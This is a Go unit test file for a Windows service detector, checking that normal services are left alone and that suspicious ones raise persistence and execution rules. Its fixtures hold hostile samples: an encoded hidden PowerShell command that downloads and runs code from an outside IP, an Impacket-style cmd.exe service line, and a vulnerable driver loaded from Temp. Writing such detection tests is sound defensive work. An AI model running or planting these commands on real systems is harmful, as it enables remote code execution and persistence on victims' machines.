package collector

import "testing"

func TestJudgeServiceQuietOnNormalServices(t *testing.T) {
	normal := []serviceConfig{
		{Name: "Schedule", Command: `C:\Windows\system32\svchost.exe -k netsvcs -p`, Image: `C:\Windows\system32\svchost.exe`,
			ServiceDLL: `C:\Windows\system32\schedsvc.dll`, Type: 0x20, HasType: true},
		{Name: "WinDefend", Command: `"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.24090.11-0\MsMpEng.exe"`,
			Image: `C:\ProgramData\Microsoft\Windows Defender\platform\4.18.24090.11-0\MsMpEng.exe`, Type: 0x10, HasType: true},
		{Name: "Tcpip", Command: `System32\drivers\tcpip.sys`, Image: `C:\Windows\System32\drivers\tcpip.sys`, Type: 1, HasType: true},
		{Name: "AcmeAgent", Command: `"C:\Program Files\Acme\agent.exe" --log C:\Windows\Temp\acme.log`,
			Image: `C:\Program Files\Acme\agent.exe`, Type: 0x10, HasType: true},
		// Drivers aren't started through CreateProcess: no unquoted-path issue.
		{Name: "VendorDrv", Command: `C:\Program Files\Vendor\drv.sys`, Image: `C:\Program Files\Vendor\drv.sys`, Type: 1, HasType: true},
	}
	for _, s := range normal {
		if got := judgeService(s, `C:\Windows`); len(got) != 0 {
			t.Errorf("%s: unexpected findings %v", s.Name, keys(rulesOf(got)))
		}
	}
}

func TestJudgeServiceFindsEvil(t *testing.T) {
	cases := []struct {
		svc  serviceConfig
		want []string
	}{
		{serviceConfig{Name: "PSEXESVC", Command: `%SystemRoot%\PSEXESVC.exe`, Image: `C:\Windows\PSEXESVC.exe`, Type: 0x10, HasType: true},
			[]string{"lateral.service_in_windows_dir"}},
		{serviceConfig{Name: "BTOBTO", Command: `C:\Windows\system32\cmd.exe /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & C:\Windows\system32\cmd.exe /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat`,
			Image: `C:\Windows\system32\cmd.exe`, Type: 0x10, HasType: true},
			[]string{"persistence.service_unusual_path", "persistence.service_script_host"}},
		{serviceConfig{Name: "Updater", Command: `C:\Users\Public\upd.exe`, Image: `C:\Users\Public\upd.exe`, Type: 0x10, HasType: true},
			[]string{"persistence.service_unusual_path"}},
		{serviceConfig{Name: "Vuln", Command: `C:\Program Files\Some Vendor\svc.exe -k x`, Image: `C:\Program Files\Some Vendor\svc.exe`, Type: 0x10, HasType: true},
			[]string{"persistence.service_unquoted_path"}},
		{serviceConfig{Name: "SvcHostDll", Command: `C:\Windows\system32\svchost.exe -k netsvcs`, Image: `C:\Windows\system32\svchost.exe`,
			ServiceDLL: `C:\ProgramData\x\payload.dll`, Type: 0x20, HasType: true},
			[]string{"persistence.service_unusual_path"}},
		{serviceConfig{Name: "Enc", Command: `powershell -nop -w hidden -enc ` + psEncode("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.1/x')"),
			Image: `powershell`, Type: 0x10, HasType: true},
			[]string{"persistence.service_script_host", "exec.download_execute", "exec.powershell_encoded"}},
		{serviceConfig{Name: "Recover", Command: `C:\Windows\system32\svchost.exe -k x`, Image: `C:\Windows\system32\svchost.exe`,
			FailureCommand: `C:\Users\Public\r.exe`, Type: 0x20, HasType: true},
			[]string{"persistence.service_failure_command"}},
		{serviceConfig{Name: "Byovd", Command: `\??\C:\Windows\Temp\rtcore64.sys`, Image: `C:\Windows\Temp\rtcore64.sys`, Type: 1, HasType: true},
			[]string{"persistence.service_unusual_path"}},
	}
	for _, c := range cases {
		got := rulesOf(judgeService(c.svc, `C:\Windows`))
		for _, w := range c.want {
			if _, ok := got[w]; !ok {
				t.Errorf("%s: %s missing (got %v)", c.svc.Name, w, keys(got))
			}
		}
	}
}
